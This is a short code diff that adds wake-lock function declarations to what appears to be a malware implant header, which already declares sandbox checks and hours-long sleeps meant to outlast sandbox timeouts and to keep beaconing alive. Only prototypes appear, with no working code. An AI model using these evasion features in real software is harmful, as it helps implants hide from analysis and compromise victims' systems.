@@ -23,3 +23,7 @@ BOOL SandboxCheck();
 
 // Deep sleep (1–4 hours) – used to outlast sandbox timeouts
 VOID DeepSleep();
+
+// Sleep evasion — block OS from suspending during beacon activity
+VOID AcquireWakeLock();
+VOID ReleaseWakeLock();
